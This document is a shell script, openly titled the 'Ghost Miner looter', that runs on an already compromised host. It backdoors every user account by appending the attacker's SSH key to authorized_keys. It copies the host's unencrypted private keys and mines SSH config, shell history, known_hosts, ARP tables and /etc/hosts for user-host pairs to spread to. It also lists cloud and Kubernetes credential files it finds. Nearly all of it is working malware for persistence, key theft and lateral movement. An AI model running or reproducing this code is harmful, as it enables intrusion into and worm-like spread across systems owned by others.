#!/bin/sh
# ============================================================================
# Ghost Miner looter - the trust graph of a host we already stand on.
#
# The hunter GUESSES (key, user, host) from GitHub: a leaked key in one repo, an
# unrelated IP in the same repo. This does not guess. It reads the edges the box
# actually uses, because those triples were proven together. Precision order:
#
#   1) ~/.ssh/config       HostName + User + IdentityFile - a ready-made triple
#   2) shell history       "ssh user@host", exactly as a human typed it
#   3) ~/.ssh/known_hosts  hosts this box already talks to
#   4) its own id_* keys   staged, then used as the key for (1)-(3)
#   5) ARP/neigh + /etc/hosts - the LAN
#
# The key for all of it is the HOST'S OWN key first, not ours: a machine's own
# key is what its neighbours already trust. That is the transitive-trust hop.
#
# Rows go to .hunt/loot.txt, which hunt.sh probes BEFORE its GitHub rows. It
# also installs our public key into authorized_keys: today we only land with a
# borrowed key, so if the owner rotates it the box is lost. This makes the
# foothold durable and every child re-bootstrappable.
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
KEYS="$WORK/keys"
LOOT="$WORK/loot.txt"
mkdir -p "$KEYS"
touch "$LOOT"

TARGET_USERS="${TARGET_USERS:-root}"
OURKEY="$SYSDIR/id_key"
MAX_CFG=20; MAX_HIST=25; MAX_KNOWN=30; MAX_LAN=20
TAB=$(printf '\t')

NEW="$WORK/loot.new"; : > "$NEW"
emit() {
    if [ -n "${1:-}" ] && [ -n "${2:-}" ] && [ -n "${3:-}" ]; then
        printf '%s\t%s\t%s\n' "$1" "$2" "$3" >> "$NEW"
    fi
}

# private key -> staged copy in the keyring, or nothing if unusable
stage() {
    k=$1
    [ -n "$k" ] && [ -r "$k" ] || return 0
    case "$k" in *.pub) return 0 ;; esac
    grep -q 'PRIVATE KEY' "$k" 2>/dev/null || return 0
    grep -q 'ENCRYPTED' "$k" 2>/dev/null && return 0
    h=$(cksum < "$k" | awk '{print $1}')
    [ -n "$h" ] || return 0
    dest="$KEYS/local_$h"
    if [ ! -f "$dest" ]; then
        cp -f "$k" "$dest" 2>/dev/null || return 0
        chmod 0600 "$dest"
    fi
    info=$(ssh-keygen -l -f "$dest" 2>/dev/null) || { rm -f "$dest"; return 0; }
    case "$info" in *-SK*) rm -f "$dest"; return 0 ;; esac
    printf '%s\n' "$dest"
}

# the key to pair a discovered host with: the host's own key first
hostkey() {
    for c in "$1/.ssh/id_ed25519" "$1/.ssh/id_rsa" "$1/.ssh/id_ecdsa" "$OURKEY"; do
        s=$(stage "$c")
        [ -n "$s" ] && { printf '%s\n' "$s"; return 0; }
    done
    ls "$KEYS"/* 2>/dev/null | head -1
}

expand() { # ~ or %d -> home
    p=$(printf '%s' "$1" | tr -d '"')
    case "$p" in
        "~/"*)  p="$2/${p#\~/}" ;;
        "%d/"*) p="$2/${p#%d/}" ;;
    esac
    printf '%s' "$p"
}

homes=$(awk -F: '$3 >= 1000 && $7 !~ /(nologin|false|sync)$/ {print $6}' /etc/passwd 2>/dev/null \
        | grep -v '^/$' | sort -u | head -6)
[ -d /root ] && homes="/root $homes"

# --- 0) durable access: install our key where we can -----------------------
if [ -r "$OURKEY" ]; then
    ssh-keygen -y -f "$OURKEY" > "$SYSDIR/id_key.pub" 2>/dev/null || :
    if [ -s "$SYSDIR/id_key.pub" ]; then
        pub=$(cat "$SYSDIR/id_key.pub")
        for h in $homes; do
            [ -d "$h" ] || continue
            mkdir -p "$h/.ssh" 2>/dev/null || continue
            ak="$h/.ssh/authorized_keys"
            if [ ! -f "$ak" ] || ! grep -qF "$pub" "$ak" 2>/dev/null; then
                printf '%s\n' "$pub" >> "$ak"
                chmod 0600 "$ak" 2>/dev/null || :
                o=$(stat -c %U "$h" 2>/dev/null || echo root)
                chown "$o" "$ak" "$h/.ssh" 2>/dev/null || :
                echo "loot: installed our key for $o"
            fi
        done
    fi
fi

# --- 1) ~/.ssh/config: exact triples ---------------------------------------
for h in $homes; do
    for cfg in "$h/.ssh/config" /etc/ssh/ssh_config; do
        [ -r "$cfg" ] || continue
        awk '
            function flush() { if (hn != "") print hn "\t" usr "\t" idf; hn = ""; usr = ""; idf = "" }
            BEGIN { hn = ""; usr = ""; idf = "" }
            {
                l = $0; sub(/^[ \t]+/, "", l); sub(/[ \t]+$/, "", l)
                if (l == "" || substr(l, 1, 1) == "#") next
                split(l, a, /[ \t=]+/)
                k = tolower(a[1])
                if (k == "host")              { flush(); next }
                else if (k == "hostname")     { hn = a[2] }
                else if (k == "user")         { if (usr == "") usr = a[2] }
                else if (k == "identityfile") { if (idf == "") idf = a[2] }
            }
            END { flush() }
        ' "$cfg" 2>/dev/null | while IFS="$TAB" read -r ch cu ci; do
            ch=$(printf '%s' "$ch" | tr -d '"')
            case "$ch" in *'*'*|*'?'*|*'%'*) continue ;; esac
            [ -n "$ch" ] || continue
            k=$(hostkey "$h")
            [ -n "$k" ] || continue
            for u in ${cu:-$TARGET_USERS}; do emit "$k" "$u" "$ch"; done
        done
    done
done

# --- 2) shell history: how a human actually logs in -------------------------
for h in $homes; do
    for hf in "$h/.bash_history" "$h/.zsh_history" "$h/.ash_history" "$h/.sh_history"; do
        [ -r "$hf" ] || continue
        grep -aoE '(ssh|scp|rsync|mosh|sftp).*' "$hf" 2>/dev/null | tail -n 120 \
        | awk '{
            for (i = 1; i <= NF; i++) {
                t = $i; gsub(/["'"'"']/, "", t)
                if (t ~ /^[A-Za-z_][A-Za-z0-9_.-]*@[A-Za-z0-9_.-]+$/) print t
                else if (t ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/ || t ~ /^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+$/) print t
            }
        }' 2>/dev/null | sort -u | head -"$MAX_HIST" | while read -r t; do
            case "$t" in
                *@*) u=${t%%@*}; th=${t#*@} ;;
                *)   u='';       th=$t ;;
            esac
            [ -n "$th" ] || continue
            case "$th" in localhost|::1) continue ;; esac
            k=$(hostkey "$h")
            [ -n "$k" ] || continue
            if [ -n "$u" ]; then
                emit "$k" "$u" "$th"
            else
                for u2 in $TARGET_USERS; do emit "$k" "$u2" "$th"; done
            fi
        done
    done
done

# --- 3) known_hosts: hosts this box already talks to ------------------------
for h in $homes; do
    [ -r "$h/.ssh/known_hosts" ] || continue
    awk '{print $1}' "$h/.ssh/known_hosts" 2>/dev/null | tr ',' '\n' \
        | sed -e 's/^\[//' -e 's/\]:[0-9]*$//' \
        | grep -v '^|' | grep -v '^[*?]' | sort -u | head -"$MAX_KNOWN" \
        | while read -r kh; do
            [ -n "$kh" ] || continue
            case "$kh" in *'*'*|*'?'*) continue ;; esac
            k=$(hostkey "$h")
            [ -n "$k" ] || continue
            for u in $TARGET_USERS; do emit "$k" "$u" "$kh"; done
        done
done

# --- 4) the LAN: neighbours and /etc/hosts ---------------------------------
lan=$( { ip neigh show 2>/dev/null; arp -an 2>/dev/null; cat /etc/hosts 2>/dev/null; } \
       | awk '{ for (i = 1; i <= NF; i++) if ($i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) print $i }' \
       | grep -vE '^(127\.|0\.|255\.)' | sort -u | head -"$MAX_LAN" )
for ip in $lan; do
    k=$(hostkey /root)
    [ -n "$k" ] || continue
    for u in $TARGET_USERS; do emit "$k" "$u" "$ip"; done
done

# --- 5) recorded, not probed yet: cluster + cloud credentials --------------
for h in $homes; do
    for f in "$h/.kube/config" /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig \
             "$h/.aws/credentials" "$h/.config/hcloud/cli.toml" "$h/.config/doctl/config.yaml" \
             "$h/.terraform.d/credentials.tfrc.json" "$h/.config/gcloud"; do
        [ -e "$f" ] && echo "loot: found $f"
    done
done

# --- merge -----------------------------------------------------------------
new=$(sort -u "$NEW" 2>/dev/null | wc -l)
if [ "$new" -gt 0 ]; then
    { cat "$NEW" "$LOOT" 2>/dev/null || :; } | sort -u > "$WORK/loot.tmp"
    mv -f "$WORK/loot.tmp" "$LOOT"
fi
rm -f "$NEW"
echo "loot: $new new rows (loot.txt total $(wc -l < "$LOOT")), keys staged $(ls "$KEYS" 2>/dev/null | wc -l)"


